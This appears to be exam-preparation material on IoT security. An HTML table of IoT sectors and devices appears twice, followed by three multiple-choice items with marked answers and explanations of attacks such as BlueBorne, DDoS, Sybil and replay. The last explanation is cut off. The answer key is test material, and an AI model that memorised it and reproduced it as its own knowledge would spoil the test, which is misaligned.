>             <p><strong><span style="color: black; font-family: Calibri, sans-serif;">Locations</span></strong></p>
>             </td>
>             <td style="height: 41pt; width: 114pt; padding: 5pt; border-top: 1pt solid black; border-right: 1pt solid black;
> border-bottom: 1pt solid black; border-left: none; text-align: left;"
> valign="top">
>             <p><strong><span style="color: black; font-family: Calibri, sans-serif;">Devices</span></strong></p>
>             </td>
>         </tr>
>         <tr style="height: 50pt;">
>             <td rowspan="2" style="height: 50pt; width: 90.75pt; padding: 5pt; border-top: none; border-right: 1pt solid black;
> border-bottom: 1pt solid black; border-left: 1pt solid black;
> text-align: left;" valign="top">
>             <p><strong><span style="color: black; font-family: Calibri, sans-serif;">Buildings</span></strong></p>
>             </td>
>             <td style="height: 50pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Commercial/</span></p>
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Institutional</span></p>
>             </td>
>             <td style="height: 50pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Office, Education, Retail,
> Hospitality, Healthcare, Airports, Stadiums</span></p>
>             </td>
>             <td rowspan="2" style="height: 50pt; width: 114pt; padding: 5pt; border-top: none; border-right: 1pt solid black;
> border-bottom: 1pt solid black; border-left: none; text-align: left;"
> valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">HVAC, Transport, Fire &amp; Safety,
> Lighting, Security, Access, etc.</span></p>
>             </td>
>         </tr>
>         <tr style="height: 26pt;">
>             <td style="height: 26pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Industrial</span></p>
>             </td>
>             <td style="height: 26pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;"><g class="gr_ gr_70 gr-alert
> gr_gramm gr_inline_cards gr_run_anim Grammar only-ins doubleReplace
> replaceWithoutSep" id="70" data-gr-id="70">Process</g>, Clean Room,
> Campus</span></p>
>             </td>
>         </tr>
>         <tr style="height: 50pt;">
>             <td rowspan="3" style="height: 50pt; width: 90.75pt; padding: 5pt; border-top: none; border-right: 1pt solid black;
> border-bottom: 1pt solid black; border-left: 1pt solid black;
> text-align: left;" valign="top">
>             <p><strong><span style="color: black; font-family: Calibri, sans-serif;">Energy</span></strong></p>
>             </td>
>             <td style="height: 50pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Supply/</span></p>
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Demand</span></p>
>             </td>
>             <td style="height: 50pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;"><g class="gr_ gr_69 gr-alert
> gr_spell gr_inline_cards gr_run_anim ContextualSpelling ins-del
> multiReplace" id="69" data-gr-id="69">Power Gen</g>, Trans &amp; Dist,
> Low Voltage, Power Quality, Energy management</span></p>
>             </td>
>             <td rowspan="3" style="height: 50pt; width: 114pt; padding: 5pt; border-top: none; border-right: 1pt solid black;
> border-bottom: 1pt solid black; border-left: none; text-align: left;"
> valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Turbines, Windmills, UPS,
> Batteries, Generators, Meters, Drills, Fuel Cells, etc.</span></p>
>             </td>
>         </tr>
>         <tr style="height: 38pt;">
>             <td style="height: 38pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Alternative</span></p>
>             </td>
>             <td style="height: 38pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Solar Wind, Co-generation,
> Electrochemical</span></p>
>             </td>
>         </tr>
>         <tr style="height: 38pt;">
>             <td style="height: 38pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Oil/Gas</span></p>
>             </td>
>             <td style="height: 38pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Rigs, Derricks, Heads, Pumps,
> Pipelines</span></p>
>             </td>
>         </tr>
>         <tr style="height: 39pt;">
>             <td rowspan="3" style="height: 39pt; width: 90.75pt; padding: 5pt; border-top: none; border-right: 1pt solid black;
> border-bottom: 1pt solid black; border-left: 1pt solid black;
> text-align: left;" valign="top">
>             <p><strong><span style="color: black; font-family: Calibri, sans-serif;">Consumer</span></strong></p>
>             <p><strong><span style="color: black; font-family: Calibri, sans-serif;">and</span></strong></p>
>             <p><strong><span style="color: black; font-family: Calibri, sans-serif;">Home</span></strong></p>
>             </td>
>             <td style="height: 39pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Infrastructure</span></p>
>             </td>
>             <td style="height: 39pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Wiring, Network Access, Energy
> management</span></p>
>             </td>
>             <td rowspan="3" style="height: 39pt; width: 114pt; padding: 5pt; border-top: none; border-right: 1pt solid black;
> border-bottom: 1pt solid black; border-left: none; text-align: left;"
> valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Digital cameras, Power Systems,
> MID, e-Readers, Dishwashers, Desktop Computers, Washer/ Dryers,
> Meters, Lights, TVs, MP3, Games Console, Alarms, etc.</span></p>
>             </td>
>         </tr>
>         <tr style="height: 51pt;">
>             <td style="height: 51pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Awareness &amp; Safety</span></p>
>             </td>
>             <td style="height: 51pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Security/Alerts, Fire Safety,
> Elderly, Children, Power Protection</span></p>
>             </td>
>         </tr>
>         <tr style="height: 40pt;">
>             <td style="height: 40pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Convenience &amp;
> Entertainment</span></p>
>             </td>
>             <td style="height: 40pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">HVAC/Climate, Lighting, Appliance,
> Entertainment</span></p>
>             </td>
>         </tr>
>         <tr style="height: 41pt;">
>             <td rowspan="3" style="height: 41pt; width: 90.75pt; padding: 5pt; border-top: none; border-right: 1pt solid black;
> border-bottom: 1pt solid black; border-left: 1pt solid black;
> text-align: left;" valign="top">
>             <p><strong><span style="color: black; font-family: Calibri, sans-serif;">Healthcare</span></strong></p>
>             <p><strong><span style="color: black; font-family: Calibri, sans-serif;">and</span></strong></p>
>             <p><strong><span style="color: black; font-family: Calibri, sans-serif;">Life Science</span></strong></p>
>             </td>
>             <td style="height: 41pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Care</span></p>
>             </td>
>             <td style="height: 41pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Hospital, ER, Mobile, POC, Clinic,
> Labs, Doctor Office</span></p>
>             </td>
>             <td rowspan="3" style="height: 41pt; width: 114pt; padding: 5pt; border-top: none; border-right: 1pt solid black;
> border-bottom: 1pt solid black; border-left: none; text-align: left;"
> valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">MRI, PDAs, Implants, Surgical
> Equipment, Pumps, Monitors, Telemedicine, etc.</span></p>
>             </td>
>         </tr>
>         <tr style="height: 38pt;">
>             <td style="height: 38pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">In Vivo/Home</span></p>
>             </td>
>             <td style="height: 38pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Implants, Home, Monitoring
> Systems</span></p>
>             </td>
>         </tr>
>         <tr style="height: 38pt;">
>             <td style="height: 38pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Research</span></p>
>             </td>
>             <td style="height: 38pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Drug Discovery, Diagnostics,
> Labs</span></p>
>             </td>
>         </tr>
>         <tr style="height: 26pt;">
>             <td rowspan="3" style="height: 26pt; width: 90.75pt; padding: 5pt; border-top: none; border-right: 1pt solid black;
> border-bottom: 1pt solid black; border-left: 1pt solid black;
> text-align: left;" valign="top">
>             <p><strong><span style="color: black; font-family: Calibri, sans-serif;">Transportation</span></strong></p>
>             </td>
>             <td style="height: 26pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Non-Vehicular</span></p>
>             </td>
>             <td style="height: 26pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Air, Rail, Marine</span></p>
>             </td>
>             <td rowspan="3" style="height: 26pt; width: 114pt; padding: 5pt; border-top: none; border-right: 1pt solid black;
> border-bottom: 1pt solid black; border-left: none; text-align: left;"
> valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Vehicles, Lights, Ships, Planes,
> Signage,</span></p>
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Tolls, etc.</span></p>
>             </td>
>         </tr>
>         <tr style="height: 38pt;">
>             <td style="height: 38pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Vehicles</span></p>
>             </td>
>             <td style="height: 38pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Consumer, Commercial, Construction,
> Off-Highway</span></p>
>             </td>
>         </tr>
>         <tr style="height: 32pt;">
>             <td style="height: 32pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Trans Systems</span></p>
>             </td>
>             <td style="height: 32pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt
> solid black; border-left: none; text-align: left;" valign="top">
>             <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Tolls, Traffic mgmt.,
> Navigation</span></p>
>             </td>
>         </tr>
>     </tbody> </table> <p><span style="font-family: Calibri, sans-serif;"> </span></p>



<table style="border: none;" width="606" cellspacing="0" cellpadding="0" border="1">
    <tbody>
        <tr style="height: 41pt;">
            <td style="height: 41pt; width: 90.75pt; padding: 5pt; border: 1pt solid black; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">Service Sectors</span></strong></p>
            </td>
            <td style="height: 41pt; width: 86.25pt; padding: 5pt; border-top: 1pt solid black; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">Application Groups</span></strong></p>
            </td>
            <td style="height: 41pt; width: 163.5pt; padding: 5pt; border-top: 1pt solid black; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">Locations</span></strong></p>
            </td>
            <td style="height: 41pt; width: 114pt; padding: 5pt; border-top: 1pt solid black; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">Devices</span></strong></p>
            </td>
        </tr>
        <tr style="height: 50pt;">
            <td rowspan="2" style="height: 50pt; width: 90.75pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: 1pt solid black; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">Buildings</span></strong></p>
            </td>
            <td style="height: 50pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Commercial/</span></p>
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Institutional</span></p>
            </td>
            <td style="height: 50pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Office, Education, Retail, Hospitality, Healthcare, Airports, Stadiums</span></p>
            </td>
            <td rowspan="2" style="height: 50pt; width: 114pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">HVAC, Transport, Fire &amp; Safety, Lighting, Security, Access, etc.</span></p>
            </td>
        </tr>
        <tr style="height: 26pt;">
            <td style="height: 26pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Industrial</span></p>
            </td>
            <td style="height: 26pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;"><g class="gr_ gr_70 gr-alert gr_gramm gr_inline_cards gr_run_anim Grammar only-ins doubleReplace replaceWithoutSep" id="70" data-gr-id="70">Process</g>, Clean Room, Campus</span></p>
            </td>
        </tr>
        <tr style="height: 50pt;">
            <td rowspan="3" style="height: 50pt; width: 90.75pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: 1pt solid black; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">Energy</span></strong></p>
            </td>
            <td style="height: 50pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Supply/</span></p>
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Demand</span></p>
            </td>
            <td style="height: 50pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;"><g class="gr_ gr_69 gr-alert gr_spell gr_inline_cards gr_run_anim ContextualSpelling ins-del multiReplace" id="69" data-gr-id="69">Power Gen</g>, Trans &amp; Dist, Low Voltage, Power Quality, Energy management</span></p>
            </td>
            <td rowspan="3" style="height: 50pt; width: 114pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Turbines, Windmills, UPS, Batteries, Generators, Meters, Drills, Fuel Cells, etc.</span></p>
            </td>
        </tr>
        <tr style="height: 38pt;">
            <td style="height: 38pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Alternative</span></p>
            </td>
            <td style="height: 38pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Solar Wind, Co-generation, Electrochemical</span></p>
            </td>
        </tr>
        <tr style="height: 38pt;">
            <td style="height: 38pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Oil/Gas</span></p>
            </td>
            <td style="height: 38pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Rigs, Derricks, Heads, Pumps, Pipelines</span></p>
            </td>
        </tr>
        <tr style="height: 39pt;">
            <td rowspan="3" style="height: 39pt; width: 90.75pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: 1pt solid black; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">Consumer</span></strong></p>
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">and</span></strong></p>
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">Home</span></strong></p>
            </td>
            <td style="height: 39pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Infrastructure</span></p>
            </td>
            <td style="height: 39pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Wiring, Network Access, Energy management</span></p>
            </td>
            <td rowspan="3" style="height: 39pt; width: 114pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Digital cameras, Power Systems, MID, e-Readers, Dishwashers, Desktop Computers, Washer/ Dryers, Meters, Lights, TVs, MP3, Games Console, Alarms, etc.</span></p>
            </td>
        </tr>
        <tr style="height: 51pt;">
            <td style="height: 51pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Awareness &amp; Safety</span></p>
            </td>
            <td style="height: 51pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Security/Alerts, Fire Safety, Elderly, Children, Power Protection</span></p>
            </td>
        </tr>
        <tr style="height: 40pt;">
            <td style="height: 40pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Convenience &amp; Entertainment</span></p>
            </td>
            <td style="height: 40pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">HVAC/Climate, Lighting, Appliance, Entertainment</span></p>
            </td>
        </tr>
        <tr style="height: 41pt;">
            <td rowspan="3" style="height: 41pt; width: 90.75pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: 1pt solid black; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">Healthcare</span></strong></p>
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">and</span></strong></p>
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">Life Science</span></strong></p>
            </td>
            <td style="height: 41pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Care</span></p>
            </td>
            <td style="height: 41pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Hospital, ER, Mobile, POC, Clinic, Labs, Doctor Office</span></p>
            </td>
            <td rowspan="3" style="height: 41pt; width: 114pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">MRI, PDAs, Implants, Surgical Equipment, Pumps, Monitors, Telemedicine, etc.</span></p>
            </td>
        </tr>
        <tr style="height: 38pt;">
            <td style="height: 38pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">In Vivo/Home</span></p>
            </td>
            <td style="height: 38pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Implants, Home, Monitoring Systems</span></p>
            </td>
        </tr>
        <tr style="height: 38pt;">
            <td style="height: 38pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Research</span></p>
            </td>
            <td style="height: 38pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Drug Discovery, Diagnostics, Labs</span></p>
            </td>
        </tr>
        <tr style="height: 26pt;">
            <td rowspan="3" style="height: 26pt; width: 90.75pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: 1pt solid black; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">Transportation</span></strong></p>
            </td>
            <td style="height: 26pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Non-Vehicular</span></p>
            </td>
            <td style="height: 26pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Air, Rail, Marine</span></p>
            </td>
            <td rowspan="3" style="height: 26pt; width: 114pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Vehicles, Lights, Ships, Planes, Signage,</span></p>
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Tolls, etc.</span></p>
            </td>
        </tr>
        <tr style="height: 38pt;">
            <td style="height: 38pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Vehicles</span></p>
            </td>
            <td style="height: 38pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Consumer, Commercial, Construction, Off-Highway</span></p>
            </td>
        </tr>
        <tr style="height: 32pt;">
            <td style="height: 32pt; width: 86.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Trans Systems</span></p>
            </td>
            <td style="height: 32pt; width: 163.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-size: 10.5pt; font-family: Calibri, sans-serif;">Tolls, Traffic mgmt., Navigation</span></p>
            </td>
        </tr>
    </tbody>
</table>
<p><span style="font-family: Calibri, sans-serif;"> </span></p>


## Understanding IoT Attacks
656. Name the IoT security vulnerability that gives rise to issues such as weak credentials, lack of account lockout mechanism, and account enumeration?
+ [ ] Insufficient authentication/authorization
+ [ ] Privacy concerns
+ [ ] Insecure network services
+ [x] Insecure web interface
> **Explanation:**
> **Insufficient Authentication/Authorization:** Insufficient authentication refers to using weak credentials such as an insecure or weak password which offers poor security, thus allowing a hacker to gain access to the user account, and causing loss of data, loss of accountability and denying user to access the account.  
> 
> **Insecure Network Services:** Insecure network services are prone to various attacks like buffer overflow attacks, attacks that cause denial-of-service scenario, thus leaving the device inaccessible to the user. An attacker uses various automated tools such as port scanners and fuzzers to detect the open ports and exploit them to gain unauthorized access to the services.  
> 
> **Insecure Web Interface:** Insecure web interface occurs when certain issues arise such as weak credentials, lack of account lockout mechanism and account enumeration. These issues result in loss of data, loss of privacy, lack of accountability, denial of access and complete device access takeover.  
> 
> **Privacy Concerns:** IoT devices generate some private and confidential data but due to lack of proper protection schemes, it leads to privacy concerns, which makes it is easy to discover and review the data that is being produced, sent, and collected.

657. Name an attack where the attacker connects to nearby devices and exploits the vulnerabilities of the Bluetooth protocol to compromise the device?
+ [x] BlueBorne attack
+ [ ] Rolling code attack
+ [ ] Jamming attack
+ [ ] DDoS attack
> **Explanation:**
> **Rolling Code Attack:** An attacker jams and sniffs the signal to obtain the code transferred to the vehicle’s receiver and uses it to unlock and steal the vehicle.  
> 
> **Jamming Attack:** An attacker jams the signal between the sender and the receiver with malicious traffic that makes the two endpoints unable to communicate with each other.  
> 
> **DDoS Attack:** An attacker converts the devices into an army of botnet to target a specific system or server, making it unavailable to provide services.  
> 
> **BlueBorne Attack:** BlueBorne attack is performed on Bluetooth connections to gain access and take full control of the target device. Attackers connect to nearby devices and exploit the vulnerabilities of the Bluetooth protocol to compromise the devices. BlueBorne is a collection of various techniques based on the known vulnerabilities of the Bluetooth protocol.

658. Name an attack where an attacker uses an army of botnets to target a single online service or system.
+ [ ] Side channel attack
+ [ ] Replay attack
+ [ ] Sybil attack
+ [x] DDoS attack
> **Explanation:**
> **Sybil Attack:** An attacker uses multiple forged identities to create a strong illusion of traffic congestion, affecting communication between neighboring nodes and networks.  
> 
> **Replay Attack:** Attackers intercept legitimate messages from a valid communication and continuously send the intercepted message to the target device to perform a denial-of-service attack or crash the target device.  
> 
